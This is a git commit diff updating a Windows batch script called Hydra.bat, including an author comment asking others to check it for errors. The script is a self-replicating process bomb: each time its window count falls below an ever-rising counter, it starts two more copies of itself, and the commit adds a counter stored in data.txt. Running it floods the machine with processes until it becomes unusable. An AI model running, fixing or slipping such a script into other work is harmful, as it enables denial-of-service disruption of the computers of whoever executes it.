74da6d52d544300c0ce16d9fb2492b0b772992b5
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 15:45:50 -0500

    Update Hydra.bat

--- Hydra.bat
+++ Hydra.bat
@@ -1,6 +1,15 @@
 @ECHO OFF
-TITLE Hydra
-set n=1
+::Wrote this on my phone so I cannot test, so can you check for any errors? 
+TITLE Hydra 
+set n=0
+:start
+set /a n+=1
+Findstr /m "%n%" data.txt
+if %errorlevel%==0 (
+goto :start
+) ELSE (
+goto :loop
+)
 :loop 
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
 SET windowcount=%%F
@@ -10,5 +19,6 @@ IF "%windowcount%"<"%n%" (
 START Hydra.bat
 START Hydra.bat
 set /a n+=1
+Echo %n% > data.txt
 )
 GOTO :loop
